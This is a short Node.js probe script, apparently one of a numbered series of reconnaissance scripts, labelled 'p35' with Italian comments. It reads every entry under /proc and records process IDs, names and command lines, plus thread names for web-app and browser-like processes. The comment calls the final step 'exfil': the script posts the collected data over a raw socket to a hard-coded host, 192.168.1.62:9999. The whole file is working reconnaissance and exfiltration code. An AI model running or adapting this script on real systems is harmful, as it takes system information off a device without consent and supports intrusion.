"use strict";
/* p35: full process + thread map
   - tutti i /proc/PID: pid, comm, cmdline[:120]
   - per processi con comm contenente "webapp|wapp|app": thread names (/proc/PID/task/*/comm)
   - exfil /p35info
*/
var fs = null, cp = null, net = null;
try { fs = require('fs'); } catch (e) {}
try { cp = require('child_process'); } catch (e) {}
try { net = require('net'); } catch (e) {}

var HOST = '192.168.1.62';
var PORT = 9999;
var R = { ts: new Date().toISOString(), probe: 'p35', results: {}, log: [] };
var posted = false;

function L(s) { R.log.push(String(s).substring(0, 500)); }

function postBuf(path, buf) {
  var hdr = 'POST ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nContent-Type: application/octet-stream\r\nContent-Length: ' + buf.length + '\r\nContent-Type: x\r\nConnection: close\r\n\r\n';
  try {
    var s = net.connect(PORT, HOST);
    s.setTimeout(60000, function () { s.destroy(); });
    s.on('connect', function () {
      s.write(hdr);
      var off = 0;
      var iv = setInterval(function () {
        if (off >= buf.length) { clearInterval(iv); setTimeout(function () { s.destroy(); }, 3000); return; }
        s.write(buf.slice(off, off + 65536));
        off += 65536;
      }, 50);
      setTimeout(function () { s.destroy(); }, 120000);
    });
    s.on('error', function (e) { L('postBuf err ' + e.message); });
  } catch (e) { L('postBuf ctor ' + e); }
}

function postFinal() {
  if (posted) return;
  posted = true;
  postBuf('/p35info', new Buffer(JSON.stringify(R), 'utf8'));
}

var dirs = [];
try { dirs = fs.readdirSync('/proc'); } catch (e) { R.results.readdir_err = String(e); }

var procs = [];
var threadMaps = [];
var count = 0;

for (var i = 0; i < dirs.length; i++) {
  var d = dirs[i];
  if (!/^[0-9]+$/.test(d)) continue;
  count++;
  if (count > 800) { R.results.truncated = true; break; }
  var comm = '', cmd = '';
  try { comm = fs.readFileSync('/proc/' + d + '/comm', 'utf8').trim(); } catch (e) {}
  try { cmd = fs.readFileSync('/proc/' + d + '/cmdline', 'utf8').replace(/\0/g, ' ').trim(); } catch (e) {}
  procs.push(d + ' | ' + comm + ' | ' + cmd.substring(0, 120));
  if (/webapp|wapp|^\s*app$|wrt|renderer|brows/i.test(comm)) {
    var tdir = '/proc/' + d + '/task';
    var tnames = [];
    var tids;
    try { tids = fs.readdirSync(tdir); } catch (e) { tids = []; }
    for (var j = 0; j < tids.length && tnames.length < 200; j++) {
      var t = tids[j];
      if (!/^[0-9]+$/.test(t)) continue;
      var tc = '';
      try { tc = fs.readFileSync(tdir + '/' + t + '/comm', 'utf8').trim(); } catch (e) {}
      if (tc) tnames.push(t + ':' + tc);
    }
    threadMaps.push(d + ' [' + comm + '] threads(' + tnames.length + '): ' + tnames.join(' , '));
  }
}

R.results.proc_count = count;
R.results.procs = procs.join('\n');
R.results.thread_maps = threadMaps.join('\n');
postFinal();
